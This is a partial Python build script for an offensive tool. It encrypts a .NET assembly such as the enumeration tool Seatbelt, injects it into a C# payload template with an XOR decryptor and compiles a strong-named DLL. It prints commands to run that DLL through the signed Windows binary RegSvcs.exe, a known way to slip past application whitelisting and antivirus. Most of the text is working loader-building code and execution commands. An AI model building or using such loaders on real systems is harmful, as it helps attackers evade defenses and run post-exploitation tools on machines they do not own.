#!/usr/bin/env python3
"""
build_regsvcs.py -- Encrypts a .NET assembly and injects into regsvcs_payload.cs

RegSvcs requires a strong-named DLL. The build script generates a keypair
with `sn -k` and compiles with `-keyfile:`.

Usage:
  python build_regsvcs.py <assembly_path> [options] [-- <assembly_args>...]

Examples:
  python build_regsvcs.py Seatbelt.exe -- -group=all
  python build_regsvcs.py Seatbelt.exe --compile -- -group=all
  python build_regsvcs.py MyLib.dll --type Namespace.Class --method Run --compile
...
def patch_template_for_xor(template: str) -> str:
    ...
    template = template.replace(
        ...
        "            byte[] clearAssembly = XorDecrypt(encrypted, aesKey);\n"
        "\n"
        "            Array.Clear(encrypted, 0, encrypted.Length);\n"
        "            Array.Clear(aesKey, 0, aesKey.Length);",
    )
...
def main():
    ...
    parser = argparse.ArgumentParser(
        description="Encrypt a .NET assembly and inject into regsvcs_payload.cs"
    )
    ...
    parser.add_argument("--compile", action="store_true",
                        help="Auto-compile with mcs (generates keypair + strong-named DLL)")
    parser.add_argument("--keyfile", help="Existing .snk key file for strong naming")
    ...
    if args.compile:
        ...
        if not args.keyfile:
            ...
            if not os.path.exists(snk_path):
                ...
                result = subprocess.run([sn, "-k", snk_path],
                                        capture_output=True, text=True)
                if result.returncode != 0:
                    print(f"[-] sn -k failed:\n{result.stderr}", file=sys.stderr)
                    sys.exit(1)
        else:
            snk_path = args.keyfile
            if not os.path.exists(snk_path):
                print(f"[-] Key file not found: {snk_path}", file=sys.stderr)
                sys.exit(1)
    ...
    if args.compile:
        print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe"
              f" {os.path.basename(dll_path)}", file=sys.stderr)
    else:
        print(f"    Note: RegSvcs requires a strong-named DLL.", file=sys.stderr)
        print(f"    Generate keypair: sn -k payload.snk", file=sys.stderr)
        print(f"    Compile: mcs -target:library -r:System.EnterpriseServices"
              f" -keyfile:payload.snk -out:payload.dll {os.path.basename(output_path)}",
              file=sys.stderr)
        print(f"    Run:     C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe"
              f" payload.dll", file=sys.stderr)
